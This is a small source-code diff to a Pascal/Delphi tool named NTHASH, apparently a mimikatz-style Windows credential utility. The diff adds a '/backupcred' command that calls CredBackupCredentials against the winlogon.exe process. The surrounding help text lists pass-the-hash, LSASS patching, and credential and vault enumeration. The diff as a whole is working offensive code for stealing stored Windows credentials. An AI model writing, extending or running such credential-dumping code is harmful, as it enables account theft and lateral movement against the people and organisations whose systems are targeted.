@@ -1044,6 +1044,7 @@ begin
   log('NTHASH /pth /user:username /password:myhash /domain:mydomain',1); //will patch lsass
   log('NTHASH /showkeymgr',1);
   log('NTHASH /writecred',1);
+  log('NTHASH /backupcred',1);
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1); //will patch lsass
   log('NTHASH /enumvault',1);
@@ -1298,6 +1299,14 @@ begin
 //***************************************************************************
 //*********************** end of input parameters ***************************
 //***************************************************************************
+
+p:=pos('/backupcred',cmdline);
+if p>0 then
+ begin
+ CredBackupCredentials_(upsapi._EnumProc2('winlogon.exe'),strtoint(pid));
+ goto fin;
+ end;
+
 p:=pos('/enumcred2',cmdline);
 if p>0 then
  begin
